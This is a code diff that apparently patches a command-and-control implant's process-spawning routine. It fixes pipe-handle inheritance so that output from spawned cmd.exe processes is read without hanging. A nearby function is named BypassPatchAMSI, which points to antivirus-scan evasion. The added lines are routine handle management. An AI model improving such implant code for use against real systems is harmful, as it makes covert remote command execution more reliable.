@@ -775,6 +775,12 @@ BOOL ProcessCreate(
 #endif
 
     if ( Return && Piped ) {
+        /* ARC-P02: close the parent's write end now that the child has its own copy;
+         * leaving it open prevents EOF from reaching AnonPipesRead after the child exits. */
+        if ( AnonPipe->StdOutWrite ) {
+            SysNtClose( AnonPipe->StdOutWrite );
+            AnonPipe->StdOutWrite = NULL;
+        }
         JobAdd( Instance->CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
     }
     else if ( ! Return && Piped )
@@ -981,12 +987,31 @@ BOOL BypassPatchAMSI(
 BOOL AnonPipesInit(
     IN PANONPIPE AnonPipes
 ) {
-    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
+    SECURITY_ATTRIBUTES SecurityAttr   = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
+    HANDLE              hReadNoInherit = NULL;
 
     if ( ! Instance->Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) ) {
         PACKAGE_ERROR_WIN32
         return FALSE;
     }
+
+    /* ARC-P01: recreate read end as non-inheritable so cmd.exe/conhost.exe cannot
+     * inherit it — if they did, ReadFile in AnonPipesRead would block indefinitely
+     * because conhost keeps the write end open after cmd.exe exits. */
+    if ( ! Instance->Win32.DuplicateHandle(
+            NtCurrentProcess(), AnonPipes->StdOutRead,
+            NtCurrentProcess(), &hReadNoInherit,
+            0, FALSE, DUPLICATE_SAME_ACCESS ) ) {
+        PACKAGE_ERROR_WIN32
+        SysNtClose( AnonPipes->StdOutRead );
+        SysNtClose( AnonPipes->StdOutWrite );
+        AnonPipes->StdOutRead  = NULL;
+        AnonPipes->StdOutWrite = NULL;
+        return FALSE;
+    }
+
+    SysNtClose( AnonPipes->StdOutRead );
+    AnonPipes->StdOutRead = hReadNoInherit;
 
     return TRUE;
 }
